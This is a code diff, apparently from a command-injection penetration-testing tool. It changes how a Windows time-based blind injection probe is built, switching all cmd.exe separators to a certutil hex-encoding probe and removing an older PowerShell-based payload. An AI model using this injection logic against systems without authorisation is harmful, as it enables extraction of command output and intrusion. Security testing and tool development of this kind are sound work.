@@ -617,19 +617,18 @@ def get_char(separator, cmd, num_of_chars, ascii_char, timesec, http_request_met
   arith_operator = "<=" if operator == "-le" else "=="
   if settings.TARGET_OS == settings.OS.WINDOWS:
     chain = checks.windows_separator(separator)
-    if chain == "&":
+    if chain is not None:
       # Read through 'certutil -encodehex' instead of PowerShell - see windows_hex_byte_probe()
-      # for why, and why it is kept to this one separator.
+      # for why. Covers every separator 'windows_separator()' can return, '&', '&&', '|' and
+      # '||' each measured live against a real target; the empty one carries the same risk as
+      # those four did before each was checked in turn, but could not be measured the same way -
+      # the one live target available takes the whole field as a single argument, with no shape
+      # for "no separator" to inject through at all. It rests instead on 'windows_tail()'
+      # already treating it the identical way for the PowerShell payload this replaces (chain +
+      # ... + "rem ", glued with nothing in between) - reasoned from that, not a live run of its
+      # own.
       payload = checks.windows_hex_byte_probe(chain, cmd, num_of_chars, win_operator,
                                               format(ascii_char, "02x"), timesec)
-    elif chain is not None:
-      # The ordinal has to be computed on the target: cmd.exe's IF compares strings by locale
-      # collation ('M' GEQ 'a' holds), so only a numeric compare can be binary searched.
-      payload = checks.windows_probe(chain,
-                                     "powershell.exe -InputFormat none write ([int](" +
-                                     checks.windows_output_bytes(checks.windows_output_text(cmd)) +
-                                     "[" + str(num_of_chars - 1) + "]))",
-                                     win_operator, ascii_char, timesec)
 
   else:
     settings.USER_APPLIED_CMD = cmd
